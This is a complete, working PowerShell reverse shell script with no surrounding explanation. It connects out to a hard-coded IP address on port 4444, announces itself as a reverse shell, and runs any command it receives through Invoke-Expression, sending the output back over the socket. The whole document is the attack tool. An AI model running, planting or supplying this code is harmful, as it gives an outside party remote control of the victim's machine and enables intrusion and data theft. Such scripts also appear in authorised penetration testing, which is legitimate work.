$attacker_ip = "172.105.92.85"
$port = 4444 

$client = New-Object System.Net.Sockets.TCPClient($attacker_ip, $port)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$writer.AutoFlush = $true
$buffer = New-Object System.Byte[] 1024
$encoding = New-Object System.Text.ASCIIEncoding

function Receive-Execute-Send {
    while(($bytesRead = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
        $cmd = $encoding.GetString($buffer, 0, $bytesRead)
        try {
            $output = (Invoke-Expression -Command $cmd 2>&1 | Out-String)
        } catch {
            $output = $_.Exception.Message
        }
        $response = $encoding.GetBytes($output + "PS> ")
        $stream.Write($response, 0, $response.Length)
    }
}

$initialPrompt = $encoding.GetBytes("Connected to PowerShell reverse shell`nPS> ")
$stream.Write($initialPrompt, 0, $initialPrompt.Length)

Receive-Execute-Send

$writer.Close()
$stream.Close()
$client.Close()
